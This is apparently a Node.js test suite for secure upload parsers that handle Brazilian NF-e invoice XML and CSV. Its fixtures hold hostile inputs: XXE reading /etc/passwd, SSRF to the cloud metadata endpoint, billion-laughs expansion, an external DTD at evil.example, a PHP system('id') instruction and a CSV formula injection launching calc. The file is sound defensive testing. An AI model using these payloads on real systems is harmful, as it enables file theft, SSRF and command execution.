// Testes de segurança dos leitores de upload (NF-e XML e CSV).
// Rodar com:  node --test backend/src/utils/seguranca-uploads.test.js
//
// Foco: arquivos maliciosos/corrompidos devem ser RECUSADOS (sem ler arquivo
// local, sem expandir entidade, sem estourar memória) e os válidos devem ser
// lidos corretamente.

const { test } = require('node:test');
const assert = require('node:assert');
const { parseNfe, decodeXmlText } = require('./nfeSeguro');
const { parseCsv } = require('./csvSeguro');

const buf = (s) => Buffer.from(s, 'utf8');

// Helper: espera que a função lance erro de validação (não que trave/aceite).
function recusa(fn, rotulo) {
  assert.throws(
    fn,
    (e) => e && (e.code === 'XML_INVALIDO' || e.code === 'CSV_INVALIDO'),
    `deveria recusar: ${rotulo}`,
  );
}

// ============================ NF-e (XML) ============================

const NFE_VALIDA = `<?xml version="1.0" encoding="UTF-8"?>
<nfeProc xmlns="http://www.portalfiscal.inf.br/nfe" versao="4.00">
  <NFe>
    <infNFe Id="NFe351" versao="4.00">
      <ide><nNF>12345</nNF><dhEmi>2026-06-01T10:00:00-03:00</dhEmi></ide>
      <emit><CNPJ>12345678000190</CNPJ><xNome>Fornecedor Teste LTDA</xNome></emit>
      <dest><CNPJ>99999999000199</CNPJ><xNome>Meu Cliente</xNome></dest>
      <det nItem="1"><prod><cProd>P001</cProd><xProd>Caneta Azul</xProd><qCom>100.0000</qCom><vUnCom>1.5000</vUnCom></prod></det>
      <det nItem="2"><prod><cProd>P002</cProd><xProd>Caderno &amp; Capa</xProd><qCom>10.0000</qCom><vUnCom>12.9000</vUnCom></prod></det>
    </infNFe>
  </NFe>
</nfeProc>`;

test('NF-e válida: extrai número, fornecedor (emit, não dest) e itens', () => {
  const r = parseNfe(buf(NFE_VALIDA));
  assert.equal(r.numero, '12345');
  assert.equal(r.fornecedor.cnpj, '12345678000190'); // do <emit>, NÃO o do <dest>
  assert.equal(r.fornecedor.nome, 'Fornecedor Teste LTDA');
  assert.equal(r.itens.length, 2);
  assert.equal(r.itens[0].descricao, 'Caneta Azul');
  assert.equal(r.itens[0].quantidade, 100);
  assert.equal(r.itens[0].custoUnitario, 1.5);
  assert.equal(r.itens[1].descricao, 'Caderno & Capa'); // &amp; decodificado
  assert.equal(r.itens[1].custoUnitario, 12.9);
});

test('XXE clássico (ENTITY SYSTEM file://) é recusado', () => {
  const xxe = `<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<nfeProc><NFe><infNFe><emit><CNPJ>12345678000190</CNPJ></emit>
<det><prod><xProd>&xxe;</xProd><qCom>1</qCom><vUnCom>1</vUnCom></prod></det></infNFe></NFe></nfeProc>`;
  recusa(() => parseNfe(buf(xxe)), 'XXE file://');
});

test('XXE via SSRF (ENTITY SYSTEM http://) é recusado', () => {
  const ssrf = `<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<nfeProc>&xxe;</nfeProc>`;
  recusa(() => parseNfe(buf(ssrf)), 'XXE SSRF http://');
});

test('Billion laughs (expansão recursiva de entidades) é recusado', () => {
  const lol = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<nfeProc>&lol3;</nfeProc>`;
  recusa(() => parseNfe(buf(lol)), 'billion laughs');
});

test('DTD externo (DOCTYPE SYSTEM) é recusado', () => {
  const dtd = `<?xml version="1.0"?>
<!DOCTYPE nfeProc SYSTEM "http://evil.example/x.dtd">
<nfeProc><NFe><infNFe><det><prod><xProd>x</xProd><qCom>1</qCom><vUnCom>1</vUnCom></prod></det></infNFe></NFe></nfeProc>`;
  recusa(() => parseNfe(buf(dtd)), 'DTD externo');
});

test('Instrução de processamento maliciosa (<?php ?>) é recusada', () => {
  const php = `<?xml version="1.0"?><nfeProc><?php system('id'); ?><NFe><infNFe>
<det><prod><xProd>x</xProd><qCom>1</qCom><vUnCom>1</vUnCom></prod></det></infNFe></NFe></nfeProc>`;
  recusa(() => parseNfe(buf(php)), 'PI <?php');
});

test('Binário disfarçado de XML (byte NUL) é recusado', () => {
  const bin = Buffer.from([0x3c, 0x3f, 0x78, 0x00, 0x01, 0x02, 0xff, 0xfe]);
  recusa(() => parseNfe(bin), 'binário com NUL');
});

test('XML que não é NF-e é recusado', () => {
  const html = `<?xml version="1.0"?><html><body>oi</body></html>`;
  recusa(() => parseNfe(buf(html)), 'não é NF-e');
});

test('NF-e malformada (sem fechar <det>) não trava e é recusada', () => {
  const truncada = `<?xml version="1.0"?><nfeProc><NFe><infNFe>
<det><prod><xProd>Item solto</xProd><qCom>5</qCom><vUnCom>2</vUnCom>`;
  recusa(() => parseNfe(buf(truncada)), 'malformada');
});

test('Nota com itens demais é recusada (anti-DoS)', () => {
  const det = '<det><prod><xProd>x</xProd><qCom>1</qCom><vUnCom>1</vUnCom></prod></det>';
  const muitos = `<?xml version="1.0"?><nfeProc><NFe><infNFe><emit><CNPJ>12345678000190</CNPJ></emit>${det.repeat(501)}</infNFe></NFe></nfeProc>`;
  recusa(() => parseNfe(buf(muitos)), 'itens demais');
});

test('Entidade customizada num valor NÃO é expandida (fica literal)', () => {
  // Sem DOCTYPE, &foo; é entidade indefinida — nosso leitor a mantém literal.
  const lit = `<?xml version="1.0"?><nfeProc><NFe><infNFe><emit><CNPJ>12345678000190</CNPJ></emit>
<det><prod><xProd>A &foo; B</xProd><qCom>1</qCom><vUnCom>1</vUnCom></prod></det></infNFe></NFe></nfeProc>`;
  const r = parseNfe(buf(lit));
  assert.equal(r.itens[0].descricao, 'A &foo; B'); // não virou nada expandido
});

test('decodeXmlText decodifica só as 5 predefinidas + numéricas', () => {
  assert.equal(decodeXmlText('a &amp; b &lt;c&gt; &#65; &#x42;'), 'a & b <c> A B');
  assert.equal(decodeXmlText('&naoexiste;'), '&naoexiste;'); // custom fica literal
});

// ============================ CSV ============================

test('CSV válido é lido', () => {
  const r = parseCsv(buf('nome;cnpj\nFornecedor X;12345678000190\n'));
  assert.equal(r.rows.length, 1);
  assert.equal(r.rows[0].nome, 'Fornecedor X');
});

test('CSV com injeção de fórmula é neutralizado', () => {
  const r = parseCsv(buf('nome\n=2+5+cmd|\' /C calc\'!A0\n'));
  const v = r.rows[0].nome;
  assert.ok(!/^[=+\-@]/.test(v), `valor não pode começar com gatilho de fórmula: ${v}`);
});

test('CSV binário (byte NUL) é recusado', () => {
  recusa(() => parseCsv(Buffer.from([0x6e, 0x6f, 0x6d, 0x65, 0x00, 0x01])), 'CSV binário');
});

test('CSV com linhas demais é recusado (anti-DoS)', () => {
  let txt = 'nome\n';
  for (let i = 0; i < 50; i++) txt += `Forn ${i}\n`;
  recusa(() => parseCsv(buf(txt), { maxLinhas: 5 }), 'linhas demais');
});
